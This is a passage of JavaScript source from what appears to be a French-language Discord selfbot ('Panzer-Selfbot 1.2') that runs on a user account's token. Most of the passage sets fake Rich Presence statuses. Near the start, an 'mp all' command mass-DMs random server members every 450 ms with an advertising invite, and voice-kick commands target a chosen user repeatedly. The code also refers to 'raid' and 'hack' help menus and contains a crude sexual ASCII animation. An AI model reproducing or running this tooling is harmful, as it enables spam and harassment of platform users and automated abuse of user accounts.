        message.edit('8=:fist:==D ');
        message.edit('8==:fist:=D ');
        message.edit('8===:fist:D ');
        message.edit('8==:fist:=D ');
        message.edit('8=:fist:==D ');
        message.edit('8:fist:===D ');
        message.edit('8=:fist:==D ');
        message.edit('8==:fist:=D ');
        message.edit('8===:fist:D ');
        message.edit('8==:fist:=D:sweat_drops: ');
        message.edit('8===:fist:D:sweat_drops: ');
        console.log('Commande branlette executé.'.yellow);
    };
    if (message.content.startsWith(prefix + 'mp all')) {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur serveur**')
        };
        message.delete();
        console.log('Commande mp all executé.'.yellow);
        let argument = args.splice(2).join(' ') || '@everyonehttps://discord.gg/YqtPHbWnSZ Selfbothttps://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg';
        let guild = message.guild;
        if (!guild) {
            return
        };
        setInterval(() => {
            let membres = serveur.members.random();
            if (membres.user.bot) return;
            if (membres.user.id === client.user.id) return;
            if (db[membres.user.id]) return;
            membres.send(argument + ' mp by Panzer selfbot').catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log(membres.user.username + ' à été mp');
            db[membres.user.id] = {
                raison: 'mp'
            };
            saver()
        }, 450)
    };
    if (message.content.startsWith(prefix + "stop mp all")) {
        client.destroy().then(() => client.login(token))
        console.log("Commande mp all stopé.".yellow)
    }
    if (message.content.startsWith(prefix + "auto voice kick")) {
        if (!message.guild) return message.edit(":x: **Commande uniquement utilisable sur serveur**");
        if (!message.guild.me.hasPermission('MOVE_MEMBERS'))
            return message.reply(':x:**Tu n\'a pas la permission de kick un utilisatur**.');
        const member = message.mentions.members.first();
        if (!member) return message.edit(':x:**Veuillez mentionner un utilisateur.**');
        kicked[message.guild.id] = {
            user: member.id
        };
        kicker();
        console.log("Commande auto voice kick executé.".yellow)
        message.edit(":white_check_mark: **Auto Voice kick setup l'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**")
        if (!member.voiceChannel) return;
        member.setVoiceChannel(null);
    }
    if (message.content.startsWith(prefix + "stop auto voice kick")) {
        if (!message.guild)
            return message.edit(":x: **Commande uniquement utilisable sur serveur**");
        const member = message.mentions.members.first();
        if (!member)
            return message.edit(':x:**Veuillez mentionner un utilisateur.**');
        delete kicked[message.guild.id].user
        kicker();
        message.edit(":white_check_mark: **Auto Voice kick set up l'utilisateur ne peut desormé rejoindre les channels vocaux de ce serveur**")
        console.log("Commande auto voice kick stopé.".yellow)
    }
    if (message.content.startsWith(prefix + 'voice kick')) {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur serveur**')
        };
        if (!message.guild.me.hasPermission('MOVE_MEMBERS')) {
            return message.reply(":x:**Tu n'a pas la permission de kick un utilisatur**.")
        };
        const member = message.mentions.members.first();
        if (!member) {
            return message.edit(':x:**Veuillez mentionner un utilisateur.**')
        };
        if (!member.voiceChannel) {
            return message.edit(":x:**L'7utilisateur n'7est pas dans un channel vocal.**")
        };
        member.setVoiceChannel(null).catch(err => {
            return message.edit(":x:**L'7utilisateur n'7est pas dans un channel vocal.**")
        });
        message.edit(":white_check_mark: **L'utilisateur a été voice kick correctement**");
        console.log('Commande voice kick executé.'.yellow);
    };
    if (message.content.startsWith(prefix + 'afk')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbothttps://www.youtube.com/channel/UCCf5s70krDxaprRb9XqyRCg';
        afk[client.user.id] = {
            activé: 'oui',
            r: argument
        };
        saving();
        message.edit(':white_check_mark: **Vous etes afk pour** ' + argument);
        console.log('Commande afk executé.'.yellow);
    };
    if (message.content.startsWith(prefix + 'gucci')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'gucci').then(image => {
            rpcGenerator.getRpcImage('603405368940429315', 'gucci0').then(image1 => {
                let presence = new rpcGenerator.Rpc()
                    .setName('Gucci')
                    .setUrl('https://www.twitch.tv/')
                    .setType('WATCHING')
                    .setApplicationId('603405368940429315')
                    .setDetails('Gucci')
                    .setAssetsLargeImage(image.id)
                    .setAssetsSmallImage(image1.id)
                    .setAssetsLargeText('Panzer-Selfbot 1.2')
                    .setState(argument)
                    .setStartTimestamp(Date.now())
                    .setParty({
                        id: uuid()
                    });
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Gucci executé'.yellow);
                message.edit(':white_check_mark: **Tu regardes ' + argument + ' sur Gucci**');
            });
        });
    };
    if (message.content.startsWith(prefix + 'lacoste')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'lacoste').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Lacoste')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Lacoste')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande lacoste executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur lacoste**');
        });
    };
    if (message.content.startsWith(prefix + 'nike')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'nike').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Nike')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Nike')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Nike executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Nike**');
        });
    };
    if (message.content.startsWith(prefix + 'google')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'google').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Google')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Google')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande google executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur google**');
        });
    };
    if (message.content.startsWith(prefix + 'skype')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'skype').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Skype')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Skype')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Skype executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Skype**');
        });
    };
    if (message.content.startsWith(prefix + 'snapchat')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'snapchat').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Snapchat')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Snapchat')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Snapchat executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Snapchat**');
        });
    };
    if (message.content.startsWith(prefix + 'facebook')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'facebook').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Facebook')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Skype')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Facebook executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Facebook**');
        });
    };
    if (message.content.startsWith(prefix + 'nuke dm')) {
        let i = '';
        message.edit('**Nuking dms...**');
        client.users.forEach(user => {
            return user.deleteDM().catch(i = 'zebi');
        });
        message.edit(':white_check_mark: **Nuked dms**');
        console.log('Commande nuke dm exectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'tiktok')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tiktok').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Tiktok')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Tiktok')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Tiktok executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Tiktok**');
        });
    };
    if (message.content.startsWith(prefix + 'twitter')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'twitter').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Twitter')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Twitter')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Twitter executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Twitter**');
        });
    };
    if (message.content.startsWith(prefix + 'instagram')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'instagram').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Instagram')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Instagram')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Instagram executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Instagram**');
        });
    };
    if (message.content.startsWith(prefix + 'youtube')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'youtube').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Youtube')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Youtube')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Youtube executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Youtube**');
        });
    };
    if (message.content.startsWith(prefix + 'tokyo ghoul')) {
        let argument = args.splice(2).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tokyo').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Tokyo Ghoul')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Tokyo Ghoul')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Tokyo Ghoul executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(2).join(' ') || 'Panzer-Selfbot') + ' sur Tokyo Ghoul**');
        });
    };
    if (message.content.startsWith(prefix + 'hunter x hunter')) {
        let argument = args.splice(3).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'hxh').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Hunter X Hunter')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Hunter X Hunter')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Hunter X Hunter executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(3).join(' ') || 'Panzer-Selfbot') + ' sur Hunter X Hunter**');
        });
    };
    if (message.content.startsWith(prefix + 'naruto')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('721465320740487179', 'naruto').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Naruto')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('721465320740487179')
                .setDetails('Naruto')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Naruto executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Naruto**');
        });
    };
    if (message.content.startsWith(prefix + 'pornhub')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'pornhub').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Pornhub')
                .setUrl('https://www.twitch.tv/')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Pornhub')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Pornhub executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Pornhub**');
        });
    };
    if (message.content.startsWith(prefix + 'clash of clan')) {
        let argument = args.splice(3).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('721465320740487179', 'clash-of-clans-app-icon').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Clash Of Clan')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('721465320740487179')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Clash Of Clan executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(3).join(' ') || 'Panzer-Selfbot') + ' sur Clash Of Clan**');
        });
    };
    if (message.content.startsWith(prefix + 'minecraft')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'minecraft').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Minecraft')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Minecraft executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Minecraft**');
        });
    };
    if (message.content.startsWith(prefix + 'clash royal')) {
        let argument = args.splice(2).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'clashroyal').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Clash Royal')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Clash Royal executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(2).join(' ') || 'Panzer-Selfbot') + ' sur Clash Royal**');
        });
    };
    if (message.content.startsWith(prefix + 'tinder')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tinder').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Tinder')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Tinder executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Tinder**');
        });
    };
    if (message.content.startsWith(prefix + 'roblox')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'roblox').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Roblox')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Roblox executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Roblox**');
        });
    };
    if (message.content.startsWith(prefix + 'badlion')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'badlion').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Badlion')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Badlion executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Badlion**');
        });
    };
    if (message.content.startsWith(prefix + 'apex')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'apex').then(image => {
            let presence = new rpcGenerator.Rpc().setName('Apex Legends').setUrl('https://www.twitch.tv/').setType('PLAYING').setApplicationId('603405368940429315').setDetails('🃏 Panzer Selfbot 🃏').setAssetsLargeImage(image.id).setAssetsLargeText('Panzer-Selfbot 1.2').setState(argument).setStartTimestamp(Date.now()).setParty({
                id: uuid()
            });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Apex Legends executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur Apex Legends**');
        });
    };
    if (message.content.startsWith(prefix + 'csgo')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'csgo').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Counter Strike')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande csgo executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur csgo**');
        });
    };
    if (message.content.startsWith(prefix + 'among us')) {
        let argument = args.splice(2).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'amongus').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Among us')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande among us executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(2).join(' ') || 'Panzer-Selfbot') + ' sur among us**');
        });
    };
    if (message.content.startsWith(prefix + 'fortnite')) {
        let argument = args.splice(1).join(' ') || 'Panzer-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'fortnite').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Fortnite')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande fortnite executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(1).join(' ') || 'Panzer-Selfbot') + ' sur fortnite**');
        });
    };
    if (message.content.startsWith(prefix + 'rocket league')) {
        let argument = args.splice(2).join(' ') || '🃏Panzer-Selfbot🃏';
        rpcGenerator.getRpcImage('603405368940429315', 'rocket_league').then(image => {
            let presence = new rpcGenerator.Rpc()
                .setName('Rocket League')
                .setUrl('https://www.twitch.tv/')
                .setType('PLAYING')
                .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                .setApplicationId('603405368940429315')
                .setDetails('🃏 Panzer Selfbot 🃏')
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText('Panzer-Selfbot 1.2')
                .setState(argument)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande rocket league executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + (args.splice(2).join(' ') || '🃏Panzer-Selfbot🃏') + ' sur rocket league**');
        });
    };
    if (message.content === prefix + 'channels list') {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        };
        if (!message.member.hasPermission('EMBED_LINKS')) {
            return message.edit(':x: **permission insuffisante (embed_links)** ' + channel.map(channels => {
                return channels.name;
            }) + '');
        };
        const channel = message.guild.channels;
        var embed = new Discord.RichEmbed()
            .setFooter('Panzer-Selfbot 1.2')
            .setColor(color)
            .addField('liste des salons:', channel.map(channels => {
                return channels.name;
            }));
        for (i = 0; i < 10; i++) {
            embed.setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        };
        console.log('Commande channels list executé'.yellow);
    };
    if (message.content === prefix + 'roles list') {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        };
        if (!message.member.hasPermission('EMBED_LINKS')) {
            return message.edit(':x: **permission insuffisante (embed_links)** ' + role.map(role => {
                return role.name;
            }) + '');
        };
        const role = message.guild.roles;
        var embed = new Discord.RichEmbed()
            .setFooter('Panzer-Selfbot 1.2')
            .setColor(color)
            .addField('liste des roles:', role.map(role => {
                return role.name;
            }));
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande roles list executé'.yellow);
    };
    if (message.content === prefix + 'cmd') {
        message.edit(cmd).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande cmd executé'.yellow);
    };
    if (message.content === prefix + 'help') {
        message.edit(help).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help executé'.yellow);
    };
    if (message.content === prefix + 'help backup') {
        message.edit(help_backup).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help backup executé'.yellow);
    };
    if (message.content === prefix + 'help raid') {
        message.edit(help_raid).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help hack executé'.yellow);
    };
    if (message.content === prefix + 'help hack') {
        message.edit(help_hack).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help raid executé'.yellow);
    };
    if (message.content === prefix + 'help statut') {
        message.channel.send(help_statut2);
        message.edit(help_statut).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help statut executé'.yellow);
    };
    if (message.content === prefix + 'help fun') {
        message.edit(help_fun).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help fun executé'.yellow);
    };
    if (message.content === prefix + 'help moderation') {
        message.edit(help_moderation).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help moderation executé'.yellow);
    };
    if (message.content === prefix + 'help nsfw') {
        message.edit(help_nsfw).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help nsfw executé'.yellow);
    };
    if (message.content === prefix + 'help utile') {
        message.edit(help_info).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande help utile executé'.yellow);
    };
    if (message.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
        const mentionuser = message.mentions.users.first() || message.author;
        const embed = new Discord.RichEmbed()
            .setAuthor(mentionuser.username)
            .setImage(mentionuser.avatarURL)
            .setColor(color)
            .setFooter('Panzer-Selfbot 1.2');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande avatar executé'.yellow);
    };
    if (message.content === prefix + 'change hypesquad brilliance') {
        let url = `${'https://discordapp.com/api/v6/hypesquad/online'}`;
        request(url, {
            method: 'POST',
            headers: {
                authorization: token,
                'content-type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            body: JSON.stringify({
                'house_id': 2
            })
        });
        message.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'brilliance\'**');
        console.log('Commande change hypesquad executé'.yellow);
    };
    if (message.content === prefix + 'change hypesquad ballance') {
        let url = `${'https://discordapp.com/api/v6/hypesquad/online'}`;
        request(url, {
            method: 'POST',
            headers: {
                authorization: token,
                'content-type': 'application/json',
